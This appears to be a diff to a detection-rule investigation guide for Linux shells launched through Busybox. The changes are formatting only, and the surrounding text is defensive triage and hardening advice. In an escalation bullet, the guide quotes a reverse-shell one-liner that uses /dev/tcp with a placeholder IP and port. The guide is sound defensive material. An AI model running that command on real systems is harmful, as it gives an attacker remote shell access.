@@ -6,12 +6,12 @@ applies_to:
 products:
   - id: security
   - id: cloud-serverless
-description: Investigation guide for the "Proxy Shell Execution via Busybox" prebuilt detection rule.
+description: 'Investigation guide for the "Proxy Shell Execution via Busybox" prebuilt detection rule.'
 ---
 
 # Proxy Shell Execution via Busybox
 
- ## Triage and analysis
+## Triage and analysis
 
 > **Disclaimer**:
 > This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.
@@ -41,4 +41,3 @@ This rule identifies Linux shells started via Busybox, indicating proxy executio
 - Reset passwords, rotate SSH keys and tokens used in the session, rebuild affected containers from clean images or reimage hosts if system binaries were changed, and restore services only after verifying no busybox-to-shell chains launch at startup.
 - Escalate to incident response if the busybox-launched shell ran as root, established a reverse connection (e.g., bash -i >& /dev/tcp/<IP>/<port>), created SUID files, or dropped payloads in /tmp, /var/tmp, or /dev/shm, or if a new busybox binary was downloaded or touched minutes before execution.
 - Harden by enforcing noexec,nosuid,nodev mounts on /tmp and /var/tmp, constraining busybox with AppArmor/SELinux to block spawning interactive shells or execution from world-writable paths, locking down container runtime exec and capabilities (e.g., disable kubectl/docker exec for non-admins, remove CAP_SYS_ADMIN), and implementing file integrity monitoring on busybox and standard shells.
-
